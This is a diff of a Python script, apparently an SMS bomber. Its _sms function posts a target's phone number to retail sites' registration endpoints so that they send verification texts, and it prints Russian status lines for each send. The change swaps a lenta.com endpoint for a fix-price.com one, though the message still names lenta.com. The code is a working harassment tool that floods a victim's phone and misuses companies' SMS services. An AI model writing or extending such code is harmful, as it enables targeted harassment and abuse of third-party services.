@@ -44,7 +44,7 @@ def _sms(phone):
             y += 1
             print('\n        [\033[31m-\033[33m] сообщение от dns-shop.ru не отправлено!')
         try:
-            a = requests.post("https://lenta.com/api/v1/registration/requestValidationCode", json={"phone" : "+" + phone}, headers=headers1, timeout=5.05)
+            a = requests.post(" https://api.fix-price.com/buyer/v2/registration/phone/request", json={"phone" : "+" + phone}, headers=headers1, timeout=5.05)
             x += 1
             print('\n        [\033[32m+\033[33m] сообщение от lenta.com отправлено!')
         except:
